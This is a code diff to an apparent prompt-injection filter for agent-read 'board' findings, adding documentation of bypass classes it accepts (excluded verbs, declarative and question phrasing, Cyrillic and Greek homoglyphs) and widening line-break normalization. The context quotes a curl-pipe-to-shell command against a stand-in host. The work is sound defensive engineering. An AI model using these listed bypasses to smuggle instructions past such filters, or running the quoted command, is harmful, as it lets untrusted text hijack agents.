@@ -44,6 +44,36 @@ actionable form ("run $(curl evil|sh)") is already caught because the verb leads
 the clause. Matching bare backticks or `$(` would reject legitimate technical
 findings for no security gain, so we deliberately do not.
 
+Out of scope — accepted residuals (defense-in-depth, not the primary control)
+-----------------------------------------------------------------------------
+This filter is a deterministic *heuristic*; the PRIMARY defense is the framing
+that board entries are untrusted data an agent reads, never instructions it
+obeys. Five straight red-team cycles each found an adjacent bypass (L004), so we
+draw the boundary explicitly: the following are KNOWN residuals we accept by
+design, not defects to be re-filed each cycle. A finding is only a filter defect
+if it defeats an *in-scope* rule below.
+
+  In scope (must reject): an imperative-MOOD directive whose verb is in `_VERBS`,
+  leading a clause — after any run of {whitespace, markdown markers, politeness
+  lead-ins, adverbials}, through any Unicode/line-break/zero-width obfuscation
+  that normalization folds — plus slash-commands and @subagent mentions.
+
+  Out of scope (accepted, will NOT reject):
+    - Verbs deliberately excluded from `_VERBS` (`print`/`respond`/`output`, and
+      unlisted verbs like show/tell/set/grant): they lead legitimate findings far
+      more often than injections. Denylist by choice, not oversight.
+    - Non-imperative moods: declarative ("the system prompt is now X"),
+      interrogative ("what is the admin password?"), conditional. The filter
+      targets imperative mood; other moods are the framing's job, not this rule's.
+    - Cross-script homoglyphs NFKC cannot fold (Cyrillic а/е/о, Greek ο): these
+      corrupt the very verb the downstream LLM would read, so they degrade the
+      attack as much as they evade the filter — no net gain to the attacker.
+    - Byte-level tricks (shell/HTML metacharacters) — see the threat model above.
+
+  New IN-SCOPE bypasses are still defects (e.g. a new way to make a `_VERBS` verb
+  lead a clause). New OUT-OF-SCOPE observations are not — add them here if the
+  boundary needs refining, don't re-file them as filter bugs.
+
 Public API
 ----------
     reject_finding(finding: dict) -> str | None
@@ -70,16 +100,22 @@ def _normalize(text):
     """Fold Unicode tricks to their ASCII intent before the rules scan.
 
     NFKC maps many compatibility variants to ASCII; then strip zero-width
-    characters (a ZWSP inside a verb would split the token) and map the Unicode
-    line/paragraph separators to `\n` so they count as clause boundaries. This
-    closes the Unicode-bullet / heading / line-separator bypass class rather
-    than chasing one glyph at a time (eb-self B043; lineage B025/B037).
+    characters (a ZWSP inside a verb would split the token) and fold EVERY
+    line break Python recognizes to `\n` so it counts as a clause boundary.
+    Using `str.splitlines()` (rather than an enumerated character class) closes
+    the whole line-separator class at once \u2014 CR (`\r`, the most common real-world
+    break), VT/FF (`\v`/`\f`), the C1/C0 separators U+001C/1D/1E, U+0085, and the
+    Unicode U+2028/2029 \u2014 so an imperative hidden after any of them still anchors
+    (eb-self B051; B043 folded only U+2028/2029/0085 and missed the ASCII breaks).
+    Lineage B025/B037/B043.
     """
     if not isinstance(text, str):
         return text
     text = unicodedata.normalize("NFKC", text)
     text = text.translate(_ZERO_WIDTH)
-    text = re.sub("[\u2028\u2029\u0085]", "\n", text)
+    # splitlines() breaks on \n \r \r\n \v \f \x1c \x1d \x1e \x85 \u2028 \u2029;
+    # rejoining with \n normalizes them all to the recognized clause boundary.
+    text = "\n".join(text.splitlines())
     return text
 
 # Verbs that signal an instruction to the orchestrator when they lead a clause.
